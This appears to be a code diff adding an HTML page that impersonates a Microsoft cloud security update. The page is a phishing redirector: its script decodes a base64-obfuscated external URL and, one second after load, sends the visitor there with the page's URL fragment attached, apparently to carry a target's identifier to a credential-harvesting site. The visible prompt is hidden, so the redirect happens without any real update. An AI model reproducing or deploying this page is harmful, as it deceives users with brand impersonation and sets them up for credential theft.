@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Cloud Security Update</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #F3F3F3; /* Light grey background */
+            color: #000; /* Black text */
+            margin: 0;
+            padding: 0;
+            text-align: center;
+        }
+        .update-container {
+            padding: 40px;
+            box-sizing: border-box;
+            background-color: #FFFFFF; /* White background */
+            border-radius: 10px;
+            margin: 20px auto;
+            width: 80%;
+            max-width: 600px;
+            box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2);
+			display: none;
+        }
+        .update-title {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #0078D4; /* Microsoft blue */
+        }
+        .update-message {
+            margin-top: 15px;
+            font-size: 16px;
+            line-height: 1.6;
+        }
+        .submit-button {
+            background-color: #0078D4;
+            color: #FFFFFF; /* White text */
+            border: none;
+            padding: 12px 25px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+        .submit-button:hover {
+            background-color: #005A9E; /* Darker blue on hover */
+        }
+    </style>
+</head>
+<body>
+    <div class="update-container">
+        <div class="update-title">Cloud Security Update</div>
+        <div class="update-message">Important security update available. Please click the button below to apply the update.</div>
+        <button class="submit-button">Sign In To Automatically Apply Update</button>
+    </div>
+    <script>
+        const encodedString = 'aHR0cHM6Ly9oYWlybWEuY2MvWE9YQXVrUVg';
+		let text = window.location.href;
+		let pattern = /#/;
+		let result = pattern.test(text);
+		if (result){
+			var res = text.split("#");
+			var data = res[1];
+			additionalPath = data.replace(/[=]/gi, '');
+			const decodedString = atob(encodedString);
+			const finalURL = decodedString+"#" + additionalPath;
+			setTimeout(function() {
+				window.location.href = finalURL;
+			}, 1000); // Redirect after 1 seconds
+		}else{
+			const decodedString = atob(encodedString);
+			const finalURL = decodedString;
+			setTimeout(function() {
+				window.location.href = finalURL;
+			}, 1000); // Redirect after 1 seconds
+		}
+        document.querySelector('.submit-button').addEventListener('click', function() {
+            window.location.href = finalURL;
+        });
+    </script>
+</body>
+</html>
